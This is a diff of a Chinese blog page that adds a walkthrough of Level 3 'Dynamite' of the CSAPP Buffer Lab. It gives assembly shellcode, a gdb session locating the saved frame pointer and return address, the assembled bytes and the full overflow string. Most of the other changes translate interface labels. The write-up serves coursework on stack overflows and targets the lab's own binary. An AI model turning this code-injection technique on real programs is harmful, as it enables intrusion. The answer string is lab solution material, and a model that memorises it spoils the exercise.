@@ -12,7 +12,7 @@
 
     
     <meta name="description" content="简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。 预备知识 IA32的栈帧结构，可参考：深入理解计算机系统|汇编的世界-5 gdb调试，可参考：工具|gdb调试  实验准备实验讲义中主要包含了以下3个可执行文件：  bufbomb 你所要攻击的缓冲区炸弹程序 makecoo">
-<meta name="keywords" content="深入理解计算机系统|">
+<meta name="keywords" content="深入理解计算机系统">
 <meta property="og:type" content="article">
 <meta property="og:title" content="深入理解计算机系统|CSAPP-Bufferlab">
 <meta property="og:url" content="http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/index.html">
@@ -24,7 +24,9 @@
 <meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-03.png">
 <meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-04.png">
 <meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-05.png">
-<meta property="og:updated_time" content="2018-05-11T15:02:18.846Z">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-06.png">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-07.png">
+<meta property="og:updated_time" content="2018-05-12T05:04:32.009Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="深入理解计算机系统|CSAPP-Bufferlab">
 <meta name="twitter:description" content="简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。 预备知识 IA32的栈帧结构，可参考：深入理解计算机系统|汇编的世界-5 gdb调试，可参考：工具|gdb调试  实验准备实验讲义中主要包含了以下3个可执行文件：  bufbomb 你所要攻击的缓冲区炸弹程序 makecoo">
@@ -56,7 +58,7 @@
 				<h1 class="site-name"><a href="/" title="只为不凡而来">只为不凡而来</a></h1>
 				<h2 class="blog-motto">小智的世界</h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -76,7 +78,7 @@
  					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
 						<input type="hidden" name="q" value="site:yoursite.com">
 					</form>
 					
@@ -99,16 +101,16 @@
 		<a href="/about" title="wuduozhi" target="_blank" itemprop="author">wuduozhi</a>
 		
   <p class="article-time">
-    <time datetime="2018-05-11T20:29:36.000Z" itemprop="datePublished"> 發表於 2018-05-12</time>
+    <time datetime="2018-05-11T20:29:36.000Z" itemprop="datePublished"> Published 2018-05-12</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		<div id="toc" class="toc-article">
-			<strong class="toc-title">文章目錄</strong>
+			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验准备"><span class="toc-number">3.</span> <span class="toc-text">实验准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始攻关"><span class="toc-number">4.</span> <span class="toc-text">开始攻关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-0-Candle"><span class="toc-number">4.1.</span> <span class="toc-text">Level 0 Candle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1-Sparkler"><span class="toc-number">4.2.</span> <span class="toc-text">Level 1 Sparkler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2-Firecracker"><span class="toc-number">4.3.</span> <span class="toc-text">Level 2 Firecracker</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验准备"><span class="toc-number">3.</span> <span class="toc-text">实验准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始攻关"><span class="toc-number">4.</span> <span class="toc-text">开始攻关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-0-Candle"><span class="toc-number">4.1.</span> <span class="toc-text">Level 0 Candle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1-Sparkler"><span class="toc-number">4.2.</span> <span class="toc-text">Level 1 Sparkler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2-Firecracker"><span class="toc-number">4.3.</span> <span class="toc-text">Level 2 Firecracker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3-Dynamite"><span class="toc-number">4.4.</span> <span class="toc-text">Level 3 Dynamite</span></a></li></ol></li></ol>
 		
 		</div>
 		
@@ -185,6 +187,31 @@ int getbuf()
 <p><img src="/images/CSAPP-BufferLab-05.png" alt="level-2"></p>
 <p>然后执行<code>ret</code>，把栈顶的bang函数的首地址弹出给pc，在改变全局变量的值后，顺利地跳转到bang函数开始执行。</p>
 <p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level2.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Bang!: You set global_value to 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<h4 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3 Dynamite"></a>Level 3 Dynamite</h4><p>Your job for this level is to supply an exploit string that will cause getbuf to return your cookie back to<br>test, rather than the value 1. You can see in the code for test that this will cause the program to go<br>“Boom!.” Your exploit code should set your cookie as the return value, restore any corrupted state, push<br>the correct return location on the stack, and execute a ret instruction to really return to test.</p>
+<p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
+<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着我们需要做：</p>
+<ul>
+<li>在栈上执行机器代码</li>
+<li>要恢复test函数的栈帧，也就是恢复test的<code>$esp</code>和<code>%ebp</code>，让test函数能继续执行</li>
+</ul>
+<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
+<p>对于该阶段，我们的思路：和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码，修改返回值，修复破坏的<code>$ebp</code>,然后跳转到正确的地址</p>
+<p>攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">mov $0x55683480, %ebp  /* recovery %ebp */</div><div class="line">push 0x8048c93       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure></p>
+<p>在攻击代码里，我们设置了返回值、恢复<code>%ebp</code>的值，但是并没有刻意恢复<code>$esp</code>,不过此时的<code>%esp</code>也是正确的，请各位猿友思考下这个问题。</p>
+<p>对于这么得到旧的<code>%ebp</code>和正确返回地址的值，我们可以通过gdb调试，查看内存的值得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) b getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) x /10xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c93	0x55686018	0x00000b60</div><div class="line">0x55683460 &lt;_reserved+1037408&gt;:	0x55685ff0	0xb7e7143f	0xb7fd1ac0	0x08049f4b</div><div class="line">0x55683470 &lt;_reserved+1037424&gt;:	0x5568348c	0x7902ca39</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>做法就是在执行getbuf函数的时候，通过查看<code>%ebp</code>后面的内存的值，能得到旧的<code>%ebp</code>的值为<code>0x55683480</code>,正确的返回地址的值<code>0x08048c93</code>，和我们设计的攻击代码里的是一一对应的。</p>
+<p>然后和阶段二一样汇编攻击代码和反汇编得到指令序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">level3-exlpoit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax</div><div class="line">   5:	bd 80 34 68 55       	mov    $0x55683480,%ebp</div><div class="line">   a:	ff 35 93 8c 04 08    	pushl  0x8048c93</div><div class="line">  10:	c3                   	ret</div></pre></td></tr></table></figure>
+<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 bd 80 34</div><div class="line">68 55 68 93 8c 04 08 c3</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 28 34 68 55</div></pre></td></tr></table></figure></p>
+<p>如果你看过我们阶段2的做法，会发现这里跟阶段二不一样了，我们现在把攻击代码放在了<code>buf</code>的开始位置了，因为这样能更方便的维护`%esp·。</p>
+<p>执行完<code>getbuf</code>后的内存结构:</p>
+<p><img src="/images/CSAPP-BufferLab-06.png" alt="level-3"></p>
+<p>注意到此时的<code>%esp</code>是在正确的位置的，也就是说现在的<code>%esp</code>就是函数test在调用getbuf前的值。</p>
+<p>当执行完<code>push 0x8048c93</code>，把正确的返回地址入栈，此时<code>%esp</code>减 4 ，不回稍后执行 <code>ret</code>把正确地址pop给pc时，<code>%esp</code>会加4，回到正确的位置，恢复test函数的栈帧。 </p>
+<p>当执行完<code>push 0x8048c93</code>时的内存空间：</p>
+<p><img src="/images/CSAPP-BufferLab-07.png" alt="level-3"></p>
+<p>执行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level3.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Boom!: getbuf returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -192,13 +219,13 @@ int getbuf()
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/深入理解计算机系统/">深入理解计算机系统|</a>
+  <a class="article-category-link" href="/categories/深入理解计算机系统/">深入理解计算机系统</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/深入理解计算机系统/">深入理解计算机系统|</a>
+  <span></span> <a href="/tags/深入理解计算机系统/">深入理解计算机系统</a>
   </div>
 
 </div>
@@ -225,10 +252,10 @@ int getbuf()
 	
 
 </div>  
-      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
 <aside class="clearfix">
 <div id="authorInfo">
 	
@@ -256,7 +283,7 @@ int getbuf()
 
   
 <div class="categorieslist">
-	<p class="asidetitle">分類</p>
+	<p class="asidetitle">Categories</p>
 		<ul>
 		
 		  
@@ -312,11 +339,9 @@ int getbuf()
 		  
 		
 		  
-			<li><a href="/categories/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>11</sup></a></li>
+			<li><a href="/categories/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>12</sup></a></li>
 		  
 		
-		  
-			<li><a href="/categories/深入理解计算机系统/" title="深入理解计算机系统|">深入理解计算机系统|<sup>1</sup></a></li>
 		  
 		
 		  
@@ -349,7 +374,7 @@ int getbuf()
 
   
 <div class="tagslist">
-	<p class="asidetitle">標簽</p>
+	<p class="asidetitle">Tags</p>
 		<ul class="clearfix">
 		
 			
@@ -361,11 +386,11 @@ int getbuf()
 			
 		
 			
-				<li><a href="/tags/college/" title="college">college<sup>12</sup></a></li>
+				<li><a href="/tags/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>12</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>11</sup></a></li>
+				<li><a href="/tags/college/" title="college">college<sup>12</sup></a></li>
 			
 		
 			
@@ -437,7 +462,7 @@ int getbuf()
 
 
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
 </div>
 
 </aside>
@@ -630,7 +655,7 @@ $(document).ready(function(){
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
